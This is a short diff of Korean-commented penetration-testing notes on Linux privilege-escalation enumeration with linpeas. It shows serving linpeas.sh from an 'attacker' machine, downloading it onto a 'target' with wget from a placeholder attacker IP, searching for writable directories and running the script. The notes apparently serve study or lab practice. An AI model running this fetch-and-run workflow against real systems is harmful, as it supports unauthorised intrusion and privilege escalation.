@@ -11,7 +11,7 @@ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
 # 탐색만 실행
 chmod +x linpeas.sh
 
-# attacker
+# attacker -> 파일 실행 위치 주의
 python3 -m http.server 80
 
 # target
@@ -21,5 +21,6 @@ wget http://공격자_IP/linpeas.sh
 # 쓰기 권한이 가능한 디렉토리 찾기
 find / -writable -type d 2>/dev/null
 
-
+# 실행
+/tmp/linpeas.sh > /tmp/linpeas_result.txt
 ```
